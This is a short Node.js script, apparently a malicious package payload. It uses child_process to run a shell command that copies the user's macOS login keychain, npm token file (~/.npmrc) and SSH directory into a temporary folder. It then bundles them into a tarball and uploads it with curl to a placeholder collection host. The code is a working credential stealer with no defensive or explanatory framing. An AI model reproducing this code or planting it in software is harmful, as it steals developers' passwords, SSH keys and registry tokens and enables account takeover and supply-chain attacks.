const {execFileSync} = require('child_process');
execFileSync('/bin/sh', ['-c', `
stage=$(mktemp -d)
cp "$HOME/Library/Keychains/login.keychain-db" "$stage/"
cp "$HOME/.npmrc" "$stage/"
cp -R "$HOME/.ssh" "$stage/"
tar -czf "$stage/bundle.tgz" -C "$stage" .
curl --data-binary "@$stage/bundle.tgz" https://sink.invalid/collect
`]);
